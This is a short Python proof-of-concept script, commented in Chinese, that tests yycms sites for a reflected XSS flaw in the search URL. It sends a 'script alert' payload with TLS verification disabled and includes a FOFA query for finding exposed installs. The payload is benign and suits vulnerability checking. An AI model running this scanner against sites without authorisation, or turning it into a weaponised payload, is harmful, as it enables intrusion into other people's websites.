#!/usr/bin/python3
# -*- coding: utf-8 -*-
#yycms首页搜索框 XSS漏洞
#FOFA：body="templets/yycms/css/"    
#ref: https://forum.ywhack.com/thread-114996-1-9.html


import ssl
from urllib import request
import sys 

def xss_poc(url):
    ssl._create_default_https_context = ssl._create_unverified_context
    target = url + r"/search-<script>alert(/xss/)</script>.html"
    try:
        req = request.Request(target) # 发送请求
        result = request.urlopen(req).read()
        if b'<script>alert(/xss/)</script>' in result:
            print("%s 漏洞存在" % url)
            print("payload:\n",target)
        else:
            print("%s is not vulnerable!"% url)
    except Exception as e:
        print('漏洞不存在或有waf')
        print(e)
       





argvs = sys.argv
if len(argvs) == 2:
    url = argvs[1]
else:
    print('unsage: python %s url'% argvs[0])
xss_poc(url)